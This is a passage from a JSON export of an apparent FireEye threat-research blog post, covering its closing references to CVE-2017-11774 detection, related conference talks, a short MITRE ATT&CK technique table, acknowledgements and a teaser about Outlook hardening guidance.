\u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/12\/overruled-containing-a-potentially-destructive-adversary.html\u0022\u003Eat the end the OVERRULED blog post\u003C\/a\u003E\u0026nbsp;still captures payloads using CVE-2017-11774, including all of those used in intrusions referenced in this post, and can also be used to proactively identify home page exploits staged on adversary infrastructure. Further FireEye product detection against CVE-2017-11774 is also covered in the OVERRULED blog post.\u003C\/p\u003E\n\u003Cp\u003EIf you’ve read the OVERRULED post (or are tired of hearing about it) but want some additional information, we recommend:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/youtu.be\/BERupu9-CIs\u0022\u003E“You’ve Got Mail!” CDS 2018 technical track presentation\u003C\/a\u003E including an APT34 CVE-2017-11774 home page sample\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/youtu.be\/pxrwdB78nuM\u0022\u003E“2 Factor 2 Furious” CDS 2018 technical track presentation\u003C\/a\u003E on attackers bypassing multifactor – the best first line of defense against APT33’s password spraying and home page usage\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/youtu.be\/hrzR8TpnjAw?t=2098\u0022\u003E“#GuardrailsOfTheGalaxy” MITRE ATT\u0026amp;CKcon 2019 lightning talk\u003C\/a\u003E on execution guardrails – or \u003Ca href=\u0022https:\/\/twitter.com\/search?q=from%3Aitsreallynick%20guardrails%20OR%20guardrailsofthegalaxy\u0026amp;f=live\u0022\u003Esee various examples shared on Twitter\u003C\/a\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EInteresting MITRE ATT\u0026amp;CK techniques explicitly referenced in this blog post:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022113\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EID\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ETechnique\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022444\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EContext\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022113\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1137\/\u0022\u003ET1137\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EOffice Application Startup\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022444\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENick Carr contributed CVE-2017-11774 on behalf of FireEye for expansion of this technique\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022113\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1480\/\u0022\u003ET1480\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExecution Guardrails\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022444\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENick Carr contributed this new technique to MITRE ATT\u0026amp;CK and it is used within the UNC1194 red team sample in this blog post\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EThe authors would like to acknowledge all of those at FireEye and the rest of the security industry who have combatted targeted attackers leveraging creative techniques like home page persistence, but especially the analysts in \u003Ca href=\u0022https:\/\/www.fireeye.com\/solutions\/managed-defense.html\u0022\u003EManaged Defense\u003C\/a\u003E SOC working around the clock to secure our customers and have disrupted this specific attack chain several times. We want to thank the \u003Ca href=\u0022https:\/\/sensepost.com\/\u0022\u003ESensePost\u003C\/a\u003E team – for their continued creativity, responsible disclosure of CVE-2017-11774, and their defensive-minded release of \u003Ca href=\u0022https:\/\/github.com\/sensepost\/notruler\u0022\u003ENotRuler\u003C\/a\u003E – as well as the \u003Ca href=\u0022https:\/\/www.trustedsec.com\/\u0022\u003ETrustedSec\u003C\/a\u003E crew for showing us some innovative implementations of these techniques and being great to coordinate with on this blog post. Lastly, thanks to Aristotle who has already offered what can only be interpreted as seasoned incident response and hardening advice for those who have seen RULER’s home page persistence in-the-wild: \u003Ci\u003E“He who is to be a good ruler must have first been ruled.”\u003C\/i\u003E\u003C\/p\u003E\n",
        "jcr:lastModified": "Wed Dec 04 2019 18:05:18 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EWe explain how attackers are \u0026quot;unpatching\u0026quot; an exploit and then provide new Outlook hardening guidance.\u003C\/p\u003E\n",
      "jcr:lastModified": "Wed Dec 04 2019 05:29:55 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Wed Dec 04 2019 05:35:57 GMT+0000",
      "imageRotate": "0"
    }
  }
}
